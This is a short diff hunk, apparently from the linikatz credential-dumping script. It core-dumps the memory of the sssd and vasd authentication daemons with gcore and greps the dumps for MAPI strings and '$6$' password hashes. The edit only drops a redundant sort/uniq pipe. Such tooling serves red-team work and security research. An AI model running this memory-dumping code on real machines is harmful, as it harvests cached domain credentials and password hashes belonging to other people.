@@ -119,11 +119,11 @@ done
 printf "I: In memory, plain text or stored as a hash\n"
 pgrep sss | while read processid
 do
-        gcore -o "sss.$$.${r}" "${processid}" 2>/dev/null | sort | uniq >>strings."linikatz.$$.${r}"
+        gcore -o "sss.$$.${r}" "${processid}" 2>/dev/null >>strings."linikatz.$$.${r}"
         strings "sss.$$.${r}.${processid}" | egrep "MAPI|\\\$6\\\$" | sort | uniq >>strings."linikatz.$$.${r}"
 done
 pgrep vasd | while read processid
 do
-        gcore -o "vas.$$.${r}" "${processid}" 2>/dev/null | sort | uniq >>strings."linikatz.$$.${r}"
+        gcore -o "vas.$$.${r}" "${processid}" 2>/dev/null >>strings."linikatz.$$.${r}"
         strings "vas.$$.${r}.${processid}" | sort | uniq >>strings."linikatz.$$.${r}"
 done
